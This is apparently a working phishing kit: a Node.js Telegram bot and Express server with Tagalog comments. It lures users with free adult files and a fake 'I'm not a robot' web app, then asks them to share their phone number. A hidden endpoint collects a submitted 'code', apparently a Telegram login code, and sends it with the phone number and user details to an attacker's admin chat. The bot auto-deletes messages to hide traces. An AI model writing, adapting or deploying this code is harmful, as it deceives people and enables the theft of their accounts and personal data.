import express from "express";
import cors from "cors";
import { Telegraf } from "telegraf";
import fetch from "node-fetch";

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html

// admin logging bot
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // numeric string, e.g. "5757713537"

if (!BOT_TOKEN) {
  throw new Error("BOT_TOKEN is not set");
}
if (!ADMIN_BOT_TOKEN) {
  throw new Error("ADMIN_BOT_TOKEN is not set");
}
if (!ADMIN_CHAT_ID) {
  throw new Error("ADMIN_CHAT_ID is not set");
}

const bot = new Telegraf(BOT_TOKEN);

// in-memory storage: Telegram user id -> phone number (shared contact)
const userPhones = new Map();

// helper: schedule delete ng message after delayMs (default 30s)
function scheduleDelete(chatId, messageId, delayMs = 30000) {
  setTimeout(() => {
    bot.telegram.deleteMessage(chatId, messageId).catch(() => {
      // ignore errors
    });
  }, delayMs);
}

// helper: reply + auto delete
async function replyAndAutoDelete(ctx, text, extra) {
  const msg = await ctx.reply(text, extra);
  scheduleDelete(ctx.chat.id, msg.message_id, 30000);
  return msg;
}

// /start handler
bot.start(async (ctx) => {
  const payload = ctx.startPayload; // from ?start=...

  if (payload !== "from_website") {
    const msg = await ctx.reply(
      "Para gumana ang bot na ito, paki-bisita muna ang website:\n" +
        WEBSITE_URL
    );
    scheduleDelete(ctx.chat.id, msg.message_id, 30000);
    return;
  }

  // 1) Hingi ng Telegram phone number (optional pero recommended)
  await replyAndAutoDelete(
    ctx,
    "Para ma-verify na legit Telegram account ka, puwede mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba (optional pero recommended).",
    {
      reply_markup: {
        keyboard: [
          [
            {
              text: "📱 Share my Telegram phone",
              request_contact: true,
            },
          ],
        ],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    }
  );

  // 2) Sabay padala ng WebApp button
  await replyAndAutoDelete(
    ctx,
    "🔞 To access the files completely free 💦\n\n" +
      "👇 Confirm that you are not a robot",
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ I'm not a robot!",
              web_app: { url: WEBAPP_URL },
            },
          ],
        ],
      },
    }
  );
});

// kapag nag-share ng contact (phone)
bot.on("contact", async (ctx) => {
  const contact = ctx.message.contact;
  if (!contact) return;

  // delete agad ang contact message ng user (para di nakatambak yung number)
  scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);

  // siguraduhin na sariling number niya, hindi ibang contact
  if (contact.user_id && contact.user_id !== ctx.from.id) {
    const warn = await ctx.reply(
      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
    );
    scheduleDelete(ctx.chat.id, warn.message_id, 30000);
    return;
  }

  userPhones.set(ctx.from.id, contact.phone_number);

  const reply = await ctx.reply(
    "Salamat! Nakuha ko na ang Telegram phone number mo. ✅\n\n" +
      "Ngayon puwede ka nang mag-tap ng “✅ I'm not a robot!” para magpatuloy.",
    {
      reply_markup: {
        remove_keyboard: true,
      },
    }
  );
  scheduleDelete(ctx.chat.id, reply.message_id, 30000);
});

// optional: mabasa data mula WebApp
bot.on("message", async (ctx) => {
  const data = ctx.message.web_app_data?.data;
  if (data) {
    console.log("WEBAPP DATA:", data);
    const msg = await ctx.reply("Verification received ✅");
    scheduleDelete(ctx.chat.id, msg.message_id, 30000);
  }
});

// HTTP server
const app = express();
app.use(cors());
app.use(express.json());

// helper: send log message sa admin bot
async function sendAdminLog(text) {
  const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: ADMIN_CHAT_ID,
    text,
  };

  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const data = await res.json();
  if (!data.ok) {
    console.error("Failed to send admin log:", data);
    throw new Error("Admin bot sendMessage failed");
  }
}

// endpoint na tinatawag ng WebApp
app.post("/api/log-code", async (req, res) => {
  console.log("Received /api/log-code body:", req.body);

  const { code, tgUser } = req.body || {};

  if (!code) {
    console.log("Missing code in request");
    return res.status(400).json({ ok: false, error: "Missing code" });
  }

  // hanapin kung may na-share na Telegram phone number ang user
  let telegramPhone = "N/A";
  if (tgUser && typeof tgUser.id === "number") {
    const stored = userPhones.get(tgUser.id);
    if (stored) {
      telegramPhone = stored;
    }
  }

  const logText = [
    "🔔 New verification submission",
    "",
    `Code: ${code}`,
    `Telegram phone (shared contact): ${telegramPhone}`,
    "",
    "Telegram user info:",
    JSON.stringify(tgUser || {}, null, 2),
    "",
    `Time: ${new Date().toISOString()}`,
  ].join("\n");

  try {
    await sendAdminLog(logText);
    console.log("Admin log sent");
    return res.json({ ok: true });
  } catch (err) {
    console.error("Admin log send error:", err);
    return res.status(500).json({ ok: false, error: "Admin log send failed" });
  }
});

app.get("/", (req, res) => {
  res.send("Bot + API is running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("HTTP server running on port", PORT);
});

bot.launch();
console.log("Bot started");

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
